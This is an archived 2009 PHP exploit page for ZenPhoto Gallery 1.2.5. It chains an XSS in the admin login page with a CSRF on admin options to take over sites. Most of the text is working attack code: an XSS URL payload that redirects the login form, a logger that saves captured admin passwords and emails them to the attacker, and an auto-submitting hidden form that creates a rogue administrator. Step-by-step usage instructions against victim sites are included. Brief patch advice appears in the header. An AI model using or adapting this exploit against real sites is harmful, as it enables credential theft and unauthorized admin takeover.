<html><head><title>ZenPhoto Gallery 1.2.5 Admin Password Reset (CRSF)</title></head><pre>&lt;?php
####################################################################
#     Zen Photo Adminstrator Password Steal/Reset Exploit          #
#+================================================================+#
#     Discovered and coded by petros [at] dusecurity.com           #
#+----------------------------------------------------------------+#
#     Affects: ZenPhoto Gallery 1.2.5		                   #
#+----------------------------------------------------------------+#
# Zenphoto is an answer to lots of calls for an online             #
# gallery solution that just makes sense. After years of           #
# bloated software that does everything and your dishes,           #
# zenphoto just shows your photos, simply. It’s got all the        #  
# functionality and “features” you need, and nothing you don’t.    #
# Where the old guys put in a bunch of modules and junk, we put    #
# a lot of thought. We hope you agree with our philosopy:          #
# simpler is better. Don’t get us wrong though –zenphoto really    #
# does have everything you need for your online gallery.           #
#+================================================================+#
#	Exploit Explaination				           #
#+================================================================+#
#                                                                  #
# This exploit actually advantage of two vulnerabilities.          #
# The first exploit is a simple XSS in the admin login page        #
# that will allow us to log the admins password. Unfortunatly,     #
# it only executes if the admin is NOT already logged in.          #
# The second is a CRSF exploit that allows you to change the       #
# admins password by automatically submitting a form.              #
# This exploit only works if the admin already logged in.          #
# Combine these and we have two ways to gain admin access          #
#                                                                  #
#+--------------------------------------------------------------=-+#
# How to patch/prevent these vulnernabilities                      #
#+--------------------------------------------------------------=-+#
#                                                                  #
# The XSS in the zp-core/admin.php page can be patched by          #
# santizing the $_GET['from'] variable before outputting it        #
#                                                                  #
# The CRSF requires either some form of referal checking or        #
# hidden security token on all forms (the latter would be better   #
#                                                                  #
#+----------------------------------------------------------------+#
# How to use this exploit to take over a ZenPhoto website          #
#+----------------------------------------------------------------+#
#                                                                  #
# To use the XSS logger make the admin click this link:            #
#                                                                  #
#+--[code snippet - put this all in one line]--+                   #
# http://victimsite.com/zp-core/admin.php?from=&quot;&gt;&lt;script&gt;          #
# document.forms[0].action=&quot;[logged url]&quot;;                         #
# &lt;/script&gt;&lt;div id=&quot;lolpwnt                                        #
#+--[ end of code snippet]--+                                      #
#                                                                  #
# Replace [logger url] with the link to this PHP script            #
# Make sure your log.txt is writable before doing this             #
# On login the admins password will be saved to the file.          #
#                                                                  #
# The next exploit is used by simply giving the link to            #
# this script to the admin. if he clicks it his password           #
# will be changed automatically to &quot;ownedbydusec&quot;                  #
#                                                                  #
# That's about it :) Enjoy!                                        #
####################################################################
#            petros [at] dusecurity [dot] com                      #
####################################################################


//* Configure the exploit *//
$site = &quot;http://victim.org/zen-photo&quot;;  // URL to vulnerable ZP install (no trailing slash!!)
$log = &quot;log.txt&quot;;			// File to save logs to
$user = &quot;admin&quot;;			// Name of the new admin
$pass = &quot;ownedbydusec&quot;;			// New admin pass
$email = &quot;you@site.com&quot;;		// Email to send log notifications to
// Do not edit below this line...

if($_POST)// We got logins from the XSS phisher
{
	$file = fopen($log, 'a');
	if(!$file) redirect();
	fwrite($file,&quot;--==[{$_SERVER['REMOTE_ADDR']}]==--\r\n&quot;);
	foreach($_POST as $key =&gt; $value)
		fwrite($file, &quot;$key = $value\r\n&quot;);
	fwrite($file,&quot;\r\n&quot;);
	fclose($file);
	@mail($email, &quot;ZenPhoto Double Penetration Exploit got a password!&quot;, &quot;Please check your log file :)&quot;);
	redirect(); //send the back to the admin page
	
}
else // try to create a new admin using CRSF
{
	$inputs = array(
&quot;saveadminoptions&quot; =&gt; &quot;true&quot;, 

&quot;totaladmins&quot; =&gt; &quot;1&quot;, 

&quot;alter_enabled&quot; =&gt; &quot;1&quot;, 

&quot;0-adminuser&quot; =&gt; $user, 

&quot;0-confirmed&quot; =&gt; &quot;2&quot;, 

&quot;0-adminpass&quot; =&gt; $pass, 

&quot;0-adminpass_2&quot; =&gt; $pass, 

&quot;0-admin_rights&quot; =&gt; &quot;1&quot;, 

&quot;0-options_rights&quot; =&gt; &quot;1&quot;, 

&quot;0-zenpage_rights&quot; =&gt; &quot;1&quot;, 

&quot;0-tags_rights&quot; =&gt; &quot;1&quot;, 

&quot;0-themes_rights&quot; =&gt; &quot;1&quot;, 

&quot;0-all_album_rights&quot; =&gt; &quot;1&quot;, 

&quot;0-edit_rights&quot; =&gt; &quot;1&quot;, 

&quot;0-comment_rights&quot; =&gt; &quot;1&quot;, 

&quot;0-upload_rights&quot; =&gt; &quot;1&quot;, 

&quot;0-view_rights&quot; =&gt; &quot;1&quot;, 

&quot;0-main_rights&quot; =&gt; &quot;1&quot;, 

&quot;0-admin_name&quot; =&gt; &quot;Owned by dusecurity.com&quot;, 

&quot;0-admin_email&quot; =&gt; 'petros was here &amp;lt;3'
);
	$action = $site.&quot;/zp-core/admin-options.php?action=saveoptions&quot;;
	echo &quot;&lt;html&gt;&lt;head&gt;&lt;script&gt;function badboy(){ document.forms[0].submit();{&lt;/script&gt;&lt;/head&gt;&quot;;
	echo &quot;&lt;body onload=\&quot;badboy();\&quot;&gt;&lt;form action=\&quot;$action\&quot; method=\&quot;POST\&quot;&gt;&quot;;
	foreach($inputs as $key =&gt; $value)
	{
		echo &quot;&lt;input name=\&quot;$key\&quot; value=\&quot;$value\&quot; type=\&quot;hidden\&quot; /&gt;&quot;;
	}
	echo '&lt;input type=&quot;submit&quot; value=&quot;Click Me!&quot; /&gt;'; //not that they have a choice lol
	echo &quot;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&quot;;
	// notify them by e-mail because the admin will probably notice he cant login
	@mail($email,&quot;ZenPhoto Double Penetration Exploit Success!&quot;, &quot;Site: $site/zp-core/admin.php\nUsername: $user\nPassword: $pass&quot;);
}


function redirect(){ header(&quot;Location: $site/zp-core/admin.php&quot;);exit; }

?&gt;

# milw0rm.com [2009-07-16]</pre></html>